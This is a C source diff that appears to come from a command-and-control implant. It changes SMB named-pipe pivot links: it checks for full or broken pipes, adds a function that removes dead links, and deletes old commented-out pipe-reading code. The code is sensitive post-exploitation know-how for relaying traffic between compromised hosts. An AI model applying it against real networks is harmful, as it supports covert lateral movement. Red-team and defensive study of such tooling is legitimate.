@@ -231,6 +231,30 @@ BOOL LinkSync( PCHAR TaskUuid, PPARSER Response )
         {
             _dbg("[LINK SYNC] Syncing %d bytes to Link ID [%x]", MsgLen, Current->AgentId);
 
+            /* TODO - This is a temporary solution, need to find a better way to handle this 
+             *        Check if the pipe is full, sadly we will lose this Msg if it is */
+            DWORD BytesAvailable = 0;
+            DWORD BytesRemaining = 0;
+            if ( PeekNamedPipe(Current->hPipe, NULL, 0, NULL, &BytesAvailable, &BytesRemaining) )
+            {
+                if ( BytesAvailable >= sizeof( UINT32 ) + PIPE_BUFFER_MAX )
+                {
+                    _dbg("Pipe is full, skipping message. Available write space: %d bytes", BytesRemaining);
+                    goto CLEANUP;
+                }
+            }
+            else
+            {
+                if ( GetLastError() == ERROR_BROKEN_PIPE )
+                {
+                    _err("Pipe is broken, removing Link ID [%x]...", Current->LinkId);
+                    LinkRemove(Current->LinkId);
+                    goto CLEANUP;
+                }
+            }
+
+
+            /* Write the Msg to the Pipe */
             if ( !PackageSendPipe(Current->hPipe, P2pMsg, MsgLen) ) 
             {
                 DWORD error = GetLastError();
@@ -334,91 +358,6 @@ VOID LinkPush()
                 Output = NULL;
                 Length = 0;
 
-                // if ( PeekNamedPipe( TempList->hPipe, NULL, 0, NULL, &BytesSize, NULL ) )
-                // {
-                //     if ( BytesSize >= sizeof( UINT32 ) )
-                //     {                           
-                //         Length = BytesSize;
-                //         Output = LocalAlloc( LPTR, Length );
-                //         memset(Output, 0, BytesSize);
-
-                //         if ( ReadFile( TempList->hPipe, Output, Length, &BytesSize, NULL ) )
-                //         {
-                //             /* Verify Our Link ID from the package */
-                //             PARSER Temp = { 0 };
-                //             ParserNew(&Temp, Output, BytesSize);
-
-                //             UINT32 TempId = ParserGetInt32(&Temp);
-                //             if ( TempId != TempList->LinkId ) {
-                //                 _dbg("Temp ID [%x]", TempId);
-                //                 _dbg("Link ID [%x]", TempList->LinkId);
-                //                 _err("Incorrect Link ID for package. Moving on...");
-                //                 ParserDestroy(&Temp);
-                //                 LocalFree(Output);
-                //                 Output = NULL;
-                //                 continue;
-                //             }
-
-                //             _dbg("Link ID [%x] has message of %d bytes", TempId, BytesSize);
-
-                //             /* Send Link msg as a delegate type (LINK_MSG) */
-                //             Package = PackageInit(NULL, FALSE);
-                //             PackageAddByte(Package, LINK_MSG);
-                //             PackageAddString(Package, TempList->AgentId, FALSE);
-                //             PackageAddBytes(Package, Temp.Buffer, Temp.Length, TRUE);
-
-                //             PackageQueue(Package);
-
-                //             /* Clean up */
-                //             ParserDestroy(&Temp);
-                //             LocalFree(Output);
-                //             Output = NULL;
-                //             Length = 0;
-                //         }
-                //         else
-                //         {
-                //             _err( "ReadFile: Failed[%d]\n", GetLastError() );
-                //             LocalFree(Output);
-                //             Output = NULL;
-                //             Length = 0;
-                //             break;
-                //         }
-                //     }
-                //     else 
-                //     {
-                //         _dbg("Link ID [%x] message less than 4 bytes", TempList->LinkId);
-                //         break;
-                //     }
-                // }
-                // else
-                // {
-                //     _err( "PeekNamedPipe: Failed[%d]\n", GetLastError() );
-
-                //     if ( GetLastError() == ERROR_BROKEN_PIPE )
-                //     {
-                //         _err( "ERROR_BROKEN_PIPE. Remove pivot" );
-
-                //         // DWORD DemonID = TempList->DemonID;
-                //         // TempList      = TempList->Next;
-                        
-                //         // BOOL  Removed = LinkRemove( DemonID );
-
-                //         // _dbg( "Link removed: %s\n", Removed ? "TRUE" : "FALSE" )
-
-                //         /* Report if we managed to remove the selected pivot */
-                //         // Package = PackageCreate( DEMON_COMMAND_PIVOT );
-                //         // PackageAddInt32( Package, DEMON_PIVOT_SMB_DISCONNECT );
-                //         // PackageAddInt32( Package, Removed );
-                //         // PackageAddInt32( Package, DemonID );
-                //         // PackageTransmit( Package );
-
-                //         break;
-                //     }
-
-                    
-                //     break;
-                // }
-
                 NumLoops++;
 
             } while ( NumLoops < MAX_SMB_PACKETS_PER_LOOP );
@@ -447,6 +386,43 @@ UINT32 PivotParseLinkId( PVOID Buffer, SIZE_T Length )
     ParserDestroy(&Parser);
 
     return Value;
+}
+
+/**
+ * @brief Remove a Link from the linked list
+ * @param [in] LinkId The Link ID to remove
+ * @return BOOL success or not
+ */
+BOOL LinkRemove( UINT32 LinkId )
+{
+    PLINKS Current = xenonConfig->SmbLinks;
+    PLINKS Prev    = NULL;
+
+    while ( Current )
+    {
+        PLINKS Next = Current->Next;
+
+        if ( Current->LinkId == LinkId )
+        {
+            if ( Current->hPipe ) CloseHandle(Current->hPipe);
+            if ( Current->PipeName ) LocalFree(Current->PipeName);
+            if ( Current->AgentId ) LocalFree(Current->AgentId);
+
+            /* Update linked list */
+            if ( Prev == NULL )
+                xenonConfig->SmbLinks = Next;
+            else
+                Prev->Next = Next;
+
+            LocalFree(Current);
+            return TRUE;
+        }
+
+        Prev    = Current;
+        Current = Next;
+    }
+
+    return FALSE;
 }
 
 
